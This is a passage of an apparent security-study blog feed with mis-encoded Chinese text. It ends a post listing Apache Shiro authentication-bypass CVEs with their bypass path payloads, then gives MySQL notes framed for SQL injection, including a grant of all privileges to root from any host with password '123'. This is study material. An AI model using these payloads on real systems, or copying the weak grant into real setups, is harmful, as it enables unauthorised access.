class="comment">anonï¼ˆåŒ¿åè®¿é—®ï¼‰ï¼šå…è®¸åŒ¿åè®¿é—®ï¼Œä¸éœ€è¦è®¤è¯ã€‚</span></span><br><span class="line"><span class="comment">authcï¼ˆèº«ä»½éªŒè¯ï¼‰ï¼šè¦æ±‚ç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯ï¼ˆç™»å½•ï¼‰æ‰èƒ½è®¿é—®ã€‚</span></span><br><span class="line"><span class="comment">userï¼ˆè®°ä½æˆ‘æˆ–èº«ä»½éªŒè¯é€šè¿‡ï¼‰ï¼šç”¨æˆ·å·²è¿›è¡Œèº«ä»½éªŒè¯æˆ–é€‰æ‹©äº†è®°ä½æˆ‘åŠŸèƒ½å¯è®¿é—®ã€‚</span></span><br><span class="line"><span class="comment">permsï¼ˆæƒé™æ§åˆ¶ï¼‰ï¼šè¦æ±‚ç”¨æˆ·å…·æœ‰ç‰¹å®šçš„æƒé™æ‰èƒ½è®¿é—®ã€‚</span></span><br><span class="line"><span class="comment">rolesï¼ˆè§’è‰²æ§åˆ¶ï¼‰ï¼šè¦æ±‚ç”¨æˆ·å…·æœ‰ç‰¹å®šçš„è§’è‰²æ‰èƒ½è®¿é—®ã€‚</span></span><br><span class="line"><span class="comment">portï¼ˆç«¯å£æ§åˆ¶ï¼‰ï¼šè¦æ±‚è¯·æ±‚çš„ç«¯å£ä¸æŒ‡å®šçš„ç«¯å£åŒ¹é…æ‰èƒ½è®¿é—®ã€‚</span></span><br><span class="line"><span class="comment">sslï¼ˆSSLå®‰å…¨ï¼‰ï¼šè¦æ±‚è¯·æ±‚é€šè¿‡SSL/TLSåè®®è¿›è¡Œå®‰å…¨è®¿é—®ã€‚</span></span><br><span class="line"><span class="comment">restï¼ˆRESTfulé£æ ¼æ”¯æŒï¼‰ï¼šä¸ºRESTful APIæä¾›æ”¯æŒã€‚</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">// ShiroFilterFactoryBeanå¸¸ç”¨æ–¹æ³•</span></span><br><span class="line"><span class="comment">setLoginUrl(String loginUrl) è®¾ç½®ç™»å½•é¡µé¢çš„URLæœªç»èº«ä»½éªŒè¯çš„ç”¨æˆ·è®¿é—®éœ€è¦èº«ä»½éªŒè¯çš„èµ„æºæ—¶å°†è¢«é‡å®šå‘åˆ°è¯¥URL</span></span><br><span class="line"><span class="comment">setSuccessUrl(String successUrl) è®¾ç½®æˆåŠŸç™»å½•åè·³è½¬çš„URL</span></span><br><span class="line"><span class="comment">setUnauthorizedUrl(String unauthorizedUrl) è®¾ç½®æœªæˆæƒé¡µé¢çš„URLï¼Œå½“ç”¨æˆ·æ²¡æœ‰è®¿é—®æƒé™æ—¶å°†è¢«é‡å®šå‘åˆ°è¯¥URL</span></span><br></pre></td></tr></table></figure><h2 id="èº«ä»½éªŒè¯ç»•è¿‡"><a href="#èº«ä»½éªŒè¯ç»•è¿‡" class="headerlink" title="èº«ä»½éªŒè¯ç»•è¿‡"></a>èº«ä»½éªŒè¯ç»•è¿‡</h2><p><strong>å¤§éƒ¨åˆ†æƒé™ç»•è¿‡éƒ½æºè‡ªäºSpringå’ŒShiroå¯¹è¯·æ±‚å¤„ç†çš„ä¸ä¸€è‡´å¯¼è‡´çš„ã€‚</strong></p><p><a href="https://xz.aliyun.com/t/11633#toc-37">Shiro å†å²æ¼æ´åˆ†æ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><table><thead><tr><th align="center">ç¼–å·</th><th align="center">ç‰ˆæœ¬å½±å“</th><th align="center">é‰´æƒè·¯å¾„</th><th align="center">ç»•è¿‡payload</th><th align="center">åç«¯é…ç½®</th></tr></thead><tbody><tr><td align="center">CVE-2023-22602</td><td align="center">Apache Shiro &lt; 1.11.0ï¼ŒSpring Boot&gt;&#x3D;2.6</td><td align="center">&#x2F;admin</td><td align="center">&#x2F;admin&#x2F;..</td><td align="center"></td></tr><tr><td align="center">CVE-2022-32532</td><td align="center">Shiro &lt; 1.9.1</td><td align="center">&#x2F;admin</td><td align="center">&#x2F;admin&#x2F;%0dï¼Œ&#x2F;admin&#x2F;%0a</td><td align="center">RegExPatternMatcher<code>&amp;&amp;</code>&#x2F;admin&#x2F;.*</td></tr><tr><td align="center">CVE-2020-1957</td><td align="center">Shiro &lt;1.5.2</td><td align="center">&#x2F;admin</td><td align="center">&#x2F;xxx&#x2F;..;&#x2F;admin&#x2F;ï¼ˆxxxä¸ºæˆæƒè·¯å¾„ï¼‰</td><td align="center"></td></tr><tr><td align="center">CVE-2016-6802</td><td align="center">shrio&lt;1.3.2</td><td align="center">&#x2F;admin</td><td align="center">&#x2F;xxx&#x2F;..&#x2F;adminï¼ˆxxxéšæ„ä¸å­˜åœ¨ä¹Ÿè¡Œï¼‰</td><td align="center"></td></tr><tr><td align="center">CVE-2020-11989</td><td align="center">shiro &lt; 1.5.3</td><td align="center">&#x2F;admin</td><td align="center">(shiroç­‰äº1.5.2ï¼‰     &#x2F;admin%25%32%66ï¼ˆ%25%32%66ä¸º&#x2F;çš„åŒé‡urlç¼–ç ï¼‰                                      (shiroå°äº1.5.3ï¼‰&#x2F;;&#x2F;admin</td><td align="center">(shiroç­‰äº1.5.2ï¼‰<code>/admin/* = authc</code>ï¼›                                          (shiroå°äº1.5.3ï¼‰<code>/admin/* = authc &amp;&amp; /** = anon</code></td></tr><tr><td align="center">CVE-2020-13933</td><td align="center">Shiro &lt; 1.6.0</td><td align="center">&#x2F;admin</td><td align="center">&#x2F;admin&#x2F;%3Bxxxï¼ˆxxxä¸ºéšæ„å­—ç¬¦ä¸²ï¼‰</td><td align="center">&#x2F;admin&#x2F;* &#x3D; authc</td></tr><tr><td align="center">CVE-2020-17510</td><td align="center">Shiro &lt; 1.7.0</td><td align="center">&#x2F;admin</td><td align="center">&#x2F;admin&#x2F;%2e</td><td align="center">&#x2F;admin&#x2F;* &#x3D; authc</td></tr><tr><td align="center">CVE-2020-17523</td><td align="center">Shiro &lt; 1.7.1</td><td align="center">&#x2F;admin</td><td align="center">&#x2F;admin%20</td><td align="center">&#x2F;admin&#x2F;* &#x3D; authc</td></tr></tbody></table><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p><a href="https://paper.seebug.org/1378/">Shiro ç»„ä»¶æ¼æ´ä¸æ”»å‡»é“¾åˆ†æ</a></p><p><a href="https://paper.seebug.org/1285/">Shiro RememberMe æ¼æ´æ£€æµ‹çš„æ¢ç´¢ä¹‹è·¯</a></p><p><a href="http://changxia3.com/2022/05/09/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%BA%94%EF%BC%88%E5%AF%B9%E6%8A%97%E7%AF%87%EF%BC%89/#rememberMe%E5%80%BC%E7%BB%95%E8%BF%87">Shiroååºåˆ—åŒ–æ¼æ´ç¬”è®°äº”ï¼ˆå¯¹æŠ—ç¯‡ï¼‰ (changxia3.com)</a></p><p><a href="https://gv7.me/articles/2021/shiro-deserialization-bypasses-waf-through-unknown-http-method/">shiroååºåˆ—åŒ–ç»•WAFä¹‹æœªçŸ¥HTTPè¯·æ±‚æ–¹æ³• | å›å¿†é£˜å¦‚é›ª (gv7.me)</a></p><p><a href="https://mp.weixin.qq.com/s/KGjylebaJnu7UB_Atqj4Sw">shiroæƒé™ç»•è¿‡æ€»ç»“ (qq.com)</a></p><p><a href="https://xz.aliyun.com/t/12643">Shiroä»å…¥é—¨åˆ°æƒé™ç»•è¿‡æ¼æ´ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å¤ç° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MysqlåŸºç¡€çŸ¥è¯†</title>
      <link href="/2023/05/01/Web%E5%AE%89%E5%85%A8%E4%B9%8BMysql%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/05/01/Web%E5%AE%89%E5%85%A8%E4%B9%8BMysql%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h2 id="Mysqlç™»å½•"><a href="#Mysqlç™»å½•" class="headerlink" title="Mysqlç™»å½•"></a>Mysqlç™»å½•</h2><h3 id="å‘½ä»¤è¡Œå‚æ•°"><a href="#å‘½ä»¤è¡Œå‚æ•°" class="headerlink" title="å‘½ä»¤è¡Œå‚æ•°"></a>å‘½ä»¤è¡Œå‚æ•°</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-u username æŒ‡å®šæ•°æ®åº“ç”¨æˆ·å  </span><br><span class="line">-p password æŒ‡å®šæ•°æ®åº“å¯†ç    </span><br><span class="line">-e æŒ‡å®šè¦è¿è¡Œçš„sqlè¯­å¥</span><br><span class="line">-D æŒ‡å®šæ•°æ®åº“å</span><br><span class="line">-P ç«¯å£</span><br></pre></td></tr></table></figure><h3 id="ç™»å½•"><a href="#ç™»å½•" class="headerlink" title="ç™»å½•"></a>ç™»å½•</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -uroot -proot [-P3306 -h127.0.0.1]</span><br></pre></td></tr></table></figure><h3 id="ä¿®æ”¹å¯†ç "><a href="#ä¿®æ”¹å¯†ç " class="headerlink" title="ä¿®æ”¹å¯†ç "></a>ä¿®æ”¹å¯†ç </h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> password <span class="keyword">for</span> root<span class="variable">@localhost</span> <span class="operator">=</span> password(<span class="string">&#x27;xxx&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="å¼€å¯è¿œç¨‹è¿æ¥"><a href="#å¼€å¯è¿œç¨‹è¿æ¥" class="headerlink" title="å¼€å¯è¿œç¨‹è¿æ¥"></a>å¼€å¯è¿œç¨‹è¿æ¥</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ä¿®æ”¹é…ç½®æ–‡ä»¶</span><br><span class="line">bind-address  = 0.0.0.0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ä¸ºéœ€è¦è¿œç¨‹ç™»å½•çš„ç”¨æˆ·èµ‹äºˆæƒé™</span><br><span class="line">grant all privileges on *.* to &#x27;root&#x27;@&#x27;%&#x27; identified by &#x27;123&#x27; with grant option;</span><br><span class="line">flush privileges;</span><br><span class="line"></span><br><span class="line">æ³¨ï¼šipå¤„å¡«%çš„è¯åˆ™è¡¨ç¤ºæ‰€æœ‰ipéƒ½å¯ä»¥è®¿é—®</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æŸ¥çœ‹ç”¨æˆ·ä¸ä¸»æœºå…³ç³»</span><br><span class="line">use mysql;</span><br><span class="line">select user,host from user;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522123236500-1687276382007.png" alt="image-20230522123236500"></p><p>mysql8</p><p><a href="https://blog.csdn.net/llf_cloud/article/details/83141338">https://blog.csdn.net/llf_cloud/article/details/83141338</a></p><h3 id="é€€å‡º"><a href="#é€€å‡º" class="headerlink" title="é€€å‡º"></a>é€€å‡º</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exit;</span><br><span class="line">quit;</span><br><span class="line">\q;</span><br></pre></td></tr></table></figure><h2 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h2><h3 id="æ¡ä»¶æŸ¥è¯¢"><a href="#æ¡ä»¶æŸ¥è¯¢" class="headerlink" title="æ¡ä»¶æŸ¥è¯¢"></a>æ¡ä»¶æŸ¥è¯¢</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">where id xxx</span><br></pre></td></tr></table></figure><p>xxxï¼š</p><table><thead><tr><th align="center">è¿ç®—ç¬¦</th><th align="center">è§£é‡Š</th></tr></thead><tbody><tr><td align="center">&#x3D;</td><td align="center">ç­‰äº</td></tr><tr><td align="center">&lt;&gt; ï¼Œ!&#x3D;</td><td align="center">ä¸ç­‰äº</td></tr><tr><td align="center">&lt;ï¼Œ&lt;&#x3D;</td><td align="center">å°äºï¼Œå°äºç­‰äº</td></tr><tr><td align="center">&gt;ï¼Œ&gt;&#x3D;</td><td align="center">å¤§äº,å¤§äºç­‰äº</td></tr><tr><td align="center">in()ï¼Œnot in()</td><td align="center">æ˜¯å¦åœ¨æ•°ç»„ä¸­</td></tr><tr><td align="center">and  ,  &amp;&amp;</td><td align="center">é€»è¾‘ä¸</td></tr><tr><td align="center">or   ,     ||</td><td align="center">é€»è¾‘æˆ–</td></tr><tr><td align="center">like â€˜%xx%â€™</td><td align="center">æ¨¡ç³ŠæŸ¥è¯¢</td></tr><tr><td align="center">is null , is not null</td><td align="center">æ˜¯å¦ä¸ºç©º</td></tr><tr><td align="center">regexp</td><td align="center">æ­£åˆ™åŒ¹é…</td></tr><tr><td align="center">is between x and y</td><td align="center">åœ¨xå’Œyä¹‹é—´</td></tr></tbody></table><h3 id="å¸¸ç”¨è¡¨"><a href="#å¸¸ç”¨è¡¨" class="headerlink" title="å¸¸ç”¨è¡¨"></a>å¸¸ç”¨è¡¨</h3><blockquote><p>æ³¨æ„sys åº“æ˜¯åœ¨<strong>MySQL5.6</strong>åŠä»¥ä¸Šç‰ˆæœ¬æ‰æœ‰çš„</p></blockquote><ul><li><p>è®°å½•æ‰€æœ‰æ•°æ®åº“åŠè¡¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">information_schema.tables</span><br><span class="line">sys.schema_table_statistics_with_buffer</span><br><span class="line">sys.x$schema_table_statistics_with_buffer</span><br><span class="line"></span><br><span class="line">å­—æ®µï¼štable_schemaï¼šæ•°æ®åº“åç§°</span><br><span class="line"> table_nameï¼šæ•°æ®åº“ä¸‹çš„æ‰€æœ‰è¡¨</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql.innodb_table_stats</span><br><span class="line">mysql.innodb_index_stats</span><br><span class="line"></span><br><span class="line">å­—æ®µï¼šdatabase_nameï¼šæ•°æ®åº“åç§°</span><br><span class="line"> table_nameï¼šæ•°æ®åº“ä¸‹çš„æ‰€æœ‰è¡¨</span><br></pre></td></tr></table></figure></li><li><p>è®°å½•æ‰€æœ‰æ•°æ®åº“</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">information_schema.schemata</span><br><span class="line"></span><br><span class="line">å­—æ®µï¼šSCHEMA_NAMEï¼šæ•°æ®åº“å</span><br></pre></td></tr></table></figure></li><li><p>è®°å½•å«æœ‰è‡ªå¢idå­—æ®µçš„æ•°æ®åº“åŠè¡¨</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sys.schema_auto_increment_columns</span><br><span class="line"></span><br><span class="line">å­—æ®µï¼štable_schemaï¼šæ•°æ®åº“åç§°</span><br><span class="line"> table_nameï¼šæ•°æ®åº“ä¸‹çš„æ‰€æœ‰è¡¨</span><br></pre></td></tr></table></figure></li><li><p>è®°å½•æ‰€æœ‰å­—æ®µ</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">information_schema.columns </span><br><span class="line"></span><br><span class="line">å­—æ®µï¼štable_nameï¼šè¡¨å</span><br><span class="line"> column_nameï¼šè¡¨ä¸‹çš„æ‰€æœ‰å­—æ®µå</span><br></pre></td></tr></table></figure></li><li><p>é…ç½®ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@@character set_ databaseï¼šå­—ç¬¦é›†</span><br><span class="line">@@hostnameï¼šè®¡ç®—æœºå</span><br><span class="line">@@version_compile_osï¼šç³»ç»Ÿç‰ˆæœ¬</span><br><span class="line">@basedir:mysqlè·¯å¾„</span><br><span class="line">@@datadir:myslq dataå­˜æ”¾è·¯å¾„</span><br><span class="line">@@sql_modeï¼šsqlæ¨¡å¼</span><br></pre></td></tr></table></figure><blockquote><p>@æ˜¯ç”¨æˆ·å˜é‡ï¼Œ@@æ˜¯ç³»ç»Ÿå˜é‡</p></blockquote></li></ul><h3 id="å¸¸ç”¨å‡½æ•°"><a href="#å¸¸ç”¨å‡½æ•°" class="headerlink" title="å¸¸ç”¨å‡½æ•°"></a>å¸¸ç”¨å‡½æ•°</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select user(); æŸ¥çœ‹å½“å‰MySQLç™»å½•çš„ç”¨æˆ·å</span><br><span class="line"></span><br><span class="line">select database(); æŸ¥çœ‹å½“å‰ä½¿ç”¨çš„æ•°æ®åº“å</span><br><span class="line"></span><br><span class="line">select version(); æŸ¥çœ‹å½“å‰MySQLç‰ˆæœ¬</span><br><span class="line"></span><br><span class="line">SHOW GRANTS FOR CURRENT_USER();æŸ¥çœ‹å½“å‰ç”¨æˆ·æƒé™</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">group_concat(å­—æ®µå) æŸ¥çœ‹æ‰€æœ‰å­—æ®µåï¼Œé»˜è®¤åˆ†éš”ç¬¦ä¸º,</span><br><span class="line">length() è·å¾—é•¿åº¦</span><br><span class="line">concat(str1,str2) è¿æ¥str1å’Œstr</span><br><span class="line">mid(str,a,length)    ä»aå¼€å§‹æˆªå–strå­—ç¬¦lengthé•¿åº¦</span><br><span class="line">substr(str,a,length) ä»aå¼€å§‹æˆªå–strå­—ç¬¦lengthé•¿åº¦</span><br><span class="line">left/right(str,length) è¿”å›æœ€å·¦è¾¹/æœ€å³è¾¹çš„lengthé•¿åº¦å­—ç¬¦</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ord(string)  è¿”å›å­—ç¬¦ä¸²ç¬¬ä¸€ä¸ªå­—ç¬¦çš„asciiç å€¼</span><br><span class="line">ascii(str) è¿”å›å­—ç¬¦çš„asciiç </span><br><span class="line">rand()éšæœºæ•°</span><br></pre></td></tr></table></figure><h3 id="å¸¸ç”¨æ“ä½œè¯­å¥"><a href="#å¸¸ç”¨æ“ä½œè¯­å¥" class="headerlink" title="å¸¸ç”¨æ“ä½œè¯­å¥"></a>å¸¸ç”¨æ“ä½œè¯­å¥</h3><h4 id="åˆ›å»ºè¡¨"><a href="#åˆ›å»ºè¡¨" class="headerlink" title="åˆ›å»ºè¡¨"></a>åˆ›å»ºè¡¨</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE IF NOT EXISTS `users`(</span><br><span class="line">   `id` INT UNSIGNED AUTO_INCREMENT,</span><br><span class="line">   `username` VARCHAR(10) NOT NULL,</span><br><span class="line">   `passwd` VARCHAR(40) NOT NULL,</span><br><span class="line">   PRIMARY KEY ( `id` )</span><br><span class="line">)ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br></pre></td></tr></table></figure><blockquote><p>AUTO_INCREMENTï¼šè‡ªå¢</p><p>PRIMARY KEYï¼šä¸»é”®</p></blockquote><h4 id="å¯¹æ•°æ®åº“çš„å¢åˆ æ”¹æŸ¥"><a href="#å¯¹æ•°æ®åº“çš„å¢åˆ æ”¹æŸ¥" class="headerlink" title="å¯¹æ•°æ®åº“çš„å¢åˆ æ”¹æŸ¥"></a>å¯¹æ•°æ®åº“çš„å¢åˆ æ”¹æŸ¥</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¢  create database æ•°æ®åº“å</span><br><span class="line">åˆ   drop database æ•°æ®åº“å</span><br><span class="line">æŸ¥  æ‰€æœ‰æ•°æ®åº“ show databases</span><br><span class="line">æ”¹  rename database æ—§å to æ–°å</span><br></pre></td></tr></table></figure><h4 id="å¯¹æ•°æ®è¡¨çš„å¢åˆ æ”¹æŸ¥"><a href="#å¯¹æ•°æ®è¡¨çš„å¢åˆ æ”¹æŸ¥" class="headerlink" title="å¯¹æ•°æ®è¡¨çš„å¢åˆ æ”¹æŸ¥"></a>å¯¹æ•°æ®è¡¨çš„å¢åˆ æ”¹æŸ¥</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¢    create table æ•°æ®è¡¨å(id int,name char(10))</span><br><span class="line">å‚æ•°å½¢å¼ï¼šå­—æ®µå å­—æ®µç±»å‹</span><br><span class="line">åˆ     drop table æ•°æ®è¡¨å</span><br><span class="line">æŸ¥    show tables </span><br><span class="line">æ”¹    alter table æ—§å to rename æ–°å</span><br></pre></td></tr></table></figure><h4 id="å¯¹è¡¨æ•°æ®çš„å¢åˆ æŸ¥æ”¹"><a href="#å¯¹è¡¨æ•°æ®çš„å¢åˆ æŸ¥æ”¹" class="headerlink" title="å¯¹è¡¨æ•°æ®çš„å¢åˆ æŸ¥æ”¹"></a>å¯¹è¡¨æ•°æ®çš„å¢åˆ æŸ¥æ”¹</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¢  insert into è¡¨å(åˆ—1ï¼Œåˆ—2 ... ) values(å€¼1ï¼Œå€¼2 ... )</span><br><span class="line"></span><br><span class="line">åˆ   delete from è¡¨å where åˆ—å = å€¼</span><br><span class="line"></span><br><span class="line">æŸ¥  æ‰€æœ‰å†…å®¹   select * from è¡¨å</span><br><span class="line">æŸ¥çœ‹è¡¨çš„ç»“æ„ DESC è¡¨å / show columns from è¡¨å</span><br><span class="line">æ¡ä»¶ä¸‹æ‰€æœ‰åˆ— select * from è¡¨å where æ¡ä»¶</span><br><span class="line">æ¡ä»¶ä¸‹éƒ¨åˆ†åˆ— select åˆ—1,åˆ—2,...,åˆ—n from è¡¨å where æ¡ä»¶;</span><br><span class="line"></span><br><span class="line">æ”¹  ä¿®æ”¹æ•°æ® update è¡¨å set åˆ—å=æ–°å€¼ where æ¡ä»¶</span><br><span class="line">    REPLACE INTO table_name  VALUES(ä¸»é”®,value..) </span><br><span class="line">ä¿®æ”¹åˆ—å alter table è¡¨å change æ—§åˆ—å æ–°åˆ—å varchar(é•¿åº¦)</span><br></pre></td></tr></table></figure><p><code>replace into</code>ï¼Œéœ€è¦æ›´æ”¹ä¸€æ•´æ¡æ•°æ®ï¼Œä¸èƒ½åªæ›´æ”¹å…¶ä¸­æŸåˆ—ã€‚</p><ul><li>å¦‚æœå¾…å†™å…¥æ•°æ®å·²ç»å­˜åœ¨ï¼Œåˆ™å…ˆåˆ é™¤è¯¥è¡Œæ•°æ®ï¼Œç„¶åæ’å…¥æ–°çš„æ•°æ®ã€‚</li><li>å¦‚æœå¾…å†™å…¥æ•°æ®ä¸å­˜åœ¨ï¼Œåˆ™ç›´æ¥æ’å…¥æ–°æ•°æ®ã€‚</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line">+----+----------+--------+</span><br><span class="line">| id | username | passwd |</span><br><span class="line">+----+----------+--------+</span><br><span class="line">|  1 | khaz     | 123    |</span><br><span class="line">|  2 | khaz2    | 1234   |</span><br><span class="line">+----+----------+--------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; replace into users values(1,&#x27;passwd&#x27;);</span><br><span class="line">ERROR 1364 (HY000): Field &#x27;username&#x27; doesn&#x27;t have a default value</span><br><span class="line"></span><br><span class="line">mysql&gt; replace into users values(1,&#x27;khaz3&#x27;,&#x27;passwd&#x27;);</span><br><span class="line">Query OK, 2 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users;</span><br><span class="line">+----+----------+--------+</span><br><span class="line">| id | username | passwd |</span><br><span class="line">+----+----------+--------+</span><br><span class="line">|  1 | khaz3    | passwd |</span><br><span class="line">|  2 | khaz2    | 1234   |</span><br><span class="line">+----+----------+--------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><h3 id="å¯¹ç”¨æˆ·çš„å¢åˆ æŸ¥æ”¹"><a href="#å¯¹ç”¨æˆ·çš„å¢åˆ æŸ¥æ”¹" class="headerlink" title="å¯¹ç”¨æˆ·çš„å¢åˆ æŸ¥æ”¹"></a>å¯¹ç”¨æˆ·çš„å¢åˆ æŸ¥æ”¹</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¢  insert into users(username,password)  values(&#x27;khaz&#x27;,&#x27;wuhu&#x27;)</span><br><span class="line">create user &#x27;ç”¨æˆ·å&#x27;@&#x27;æ¥æºåœ°å€&#x27; identified by &#x27;å¯†ç &#x27;</span><br><span class="line">åˆ   drop user ç”¨æˆ·å</span><br><span class="line">æŸ¥  select user()</span><br><span class="line">æ”¹  ä¿®æ”¹ç”¨æˆ·å rename user æ—§ç”¨æˆ·å to æ–°ç”¨æˆ·å</span><br><span class="line">ä¿®æ”¹å¯†ç  SET PASSWORD FOR ç”¨æˆ·å = PASSWORD(&#x27;abc123&#x27;);</span><br></pre></td></tr></table></figure><h2 id="sqlæ³¨å…¥ç›¸å…³è§£é‡Š"><a href="#sqlæ³¨å…¥ç›¸å…³è§£é‡Š" class="headerlink" title="sqlæ³¨å…¥ç›¸å…³è§£é‡Š"></a>sqlæ³¨å…¥ç›¸å…³è§£é‡Š</h2><h3 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h3><p>order  byè¯­å¥ç”¨äºæ ¹æ®æŒ‡å®šçš„åˆ—å¯¹ç»“æœé›†è¿›è¡Œæ’åºï¼Œæ”¯æŒå­—æ®µåå’Œå­—æ®µä½ç½®</p><p><img src="/../images/image-20230329231709625-1687276382008.png" alt="image-20230329231709625"></p><p>å¯é€‰å‚æ•°(æ’åˆ—æ–¹å¼): </p><ul><li>å‡åº(ASC) é»˜è®¤</li><li>é™åº(DESC)</li></ul><p><strong>åœ¨sqlæ³¨å…¥ä¸­çš„ä½¿ç”¨ï¼š</strong></p><blockquote><p>åˆ¤æ–­å­—æ®µæ•°ï¼šå½“å­—æ®µä½ç½®ä¸å­˜åœ¨æ—¶å°±ä¼šæŠ¥é”™</p><p>order byæ³¨å…¥</p></blockquote><h3 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h3><p>ç”¨äºåˆ†é¡µ</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span><span class="operator">*</span> <span class="keyword">from</span> article LIMIT <span class="number">1</span>,<span class="number">3</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> article LIMIT <span class="number">3</span> <span class="keyword">OFFSET</span> <span class="number">1</span></span><br><span class="line">ä¸Šé¢ä¸¤ç§å†™æ³•éƒ½è¡¨ç¤ºå– <span class="number">2</span>ã€<span class="number">3</span>ã€<span class="number">4</span> ä¸‰æ¡æ¡æ•°æ®ï¼š</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>å½“ LIMIT åé¢è·Ÿä¸¤ä¸ªå‚æ•°çš„æ—¶å€™ï¼Œç¬¬ä¸€ä¸ªæ•°è¡¨ç¤ºè¦è·³è¿‡çš„æ•°é‡ï¼Œåä¸€ä½è¡¨ç¤ºè¦å–çš„æ•°é‡</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>å½“ LIMIT å’Œ <span class="keyword">OFFSET</span> ç»„åˆä½¿ç”¨çš„æ—¶å€™ï¼ŒLIMIT åé¢åªèƒ½æœ‰ä¸€ä¸ªå‚æ•°ï¼Œè¡¨ç¤ºè¦å–çš„çš„æ•°é‡ï¼Œ<span class="keyword">OFFSET</span>è¡¨ç¤ºè¦è·³è¿‡çš„æ•°é‡ ã€‚</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span><span class="operator">*</span> <span class="keyword">from</span> article LIMIT <span class="number">3</span> </span><br><span class="line">è¡¨ç¤ºå–å‰ä¸‰æ¡æ•°æ®</span><br><span class="line">å½“ LIMIT åé¢è·Ÿä¸€ä¸ªå‚æ•°çš„æ—¶å€™ï¼Œè¯¥å‚æ•°è¡¨ç¤ºè¦å–çš„æ•°æ®çš„æ•°é‡ã€‚</span><br></pre></td></tr></table></figure><p><strong>åœ¨æ³¨å…¥ä¸­çš„ä½¿ç”¨ï¼š</strong></p><blockquote><p>ä½¿ç”¨group_concat()æ‰¹é‡æŸ¥è¯¢è¾“å‡ºç»“æœé•¿åº¦æœ‰é™åˆ¶ï¼Œéœ€è¦ä½¿ç”¨linmitä¸€æ¡ä¸€æ¡è·å–æˆ–ä½¿ç”¨concat()æ‹¼æ¥å¾—åˆ°ç»“æœ<br>limit 0,1<br>limit 1,1<br>limit 2,1<br>â€¦.</p></blockquote><h3 id="union-selectä¸select"><a href="#union-selectä¸select" class="headerlink" title="union selectä¸select"></a>union selectä¸select</h3><p>union selectè¯­å¥ç”¨æ¥åˆå¹¶ä¸¤ä¸ªæˆ–å¤šä¸ª SELECT è¯­å¥çš„ç»“æœé›†ã€‚æ‰€ä»¥union selectå¯ä»¥ç”¨æ¥æŸ¥è¯¢å…¶ä»–è¡¨ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select å­—æ®µå€¼1 from è¡¨1 union select å­—æ®µå€¼2 from è¡¨2</span><br></pre></td></tr></table></figure><h4 id="unionç‰¹æ€§"><a href="#unionç‰¹æ€§" class="headerlink" title="unionç‰¹æ€§"></a>unionç‰¹æ€§</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span><span class="keyword">union</span>  <span 